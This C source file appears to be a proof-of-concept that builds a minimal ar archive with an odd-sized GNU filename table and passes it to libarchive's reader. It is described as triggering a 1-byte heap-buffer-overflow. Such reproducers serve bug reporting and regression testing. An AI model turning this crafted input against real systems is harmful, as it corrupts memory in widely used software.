/*
 * PoC: triggers a 1-byte heap-buffer-overflow in the "ar" reader's GNU
 * filename-table parser when the table's declared size is odd.
 *
 * Reached entirely through libarchive's public API with an otherwise
 * well-formed, minimal ar archive: global magic, one "//" (GNU filename
 * table) entry whose header declares a 1-byte table, followed by that
 * one byte of content and the one alignment-padding byte a size-1 entry
 * requires.
 */
#include <archive.h>
#include <archive_entry.h>
#include <stddef.h>
#include <string.h>

static void
put(unsigned char *buf, size_t off, const char *s)
{
	memcpy(buf + off, s, strlen(s));
}

int
main(void)
{
	unsigned char data[8 + 60 + 1 + 1];
	struct archive *a;
	struct archive_entry *ae;

	memset(data, ' ', sizeof(data));

	memcpy(data, "!<arch>\n", 8);

	/* ar header for the "//" GNU filename-table entry, 60 bytes. */
	put(data, 8 + 0, "//");                 /* name (16) */
	put(data, 8 + 16, "0");                 /* date (12) */
	put(data, 8 + 28, "0");                 /* uid (6) */
	put(data, 8 + 34, "0");                 /* gid (6) */
	put(data, 8 + 40, "0");                 /* mode (8) */
	put(data, 8 + 48, "1");                 /* size (10): 1 byte table */
	put(data, 8 + 58, "`\n");               /* fmag (2) */

	/* 1-byte table content, plus the 1-byte stream alignment pad
	 * that a size-1 (odd) entry requires. */
	data[8 + 60] = 'A';
	data[8 + 60 + 1] = '\n';

	a = archive_read_new();
	archive_read_support_format_ar(a);
	archive_read_open_memory(a, data, sizeof(data));
	archive_read_next_header(a, &ae);
	archive_read_free(a);

	return 0;
}
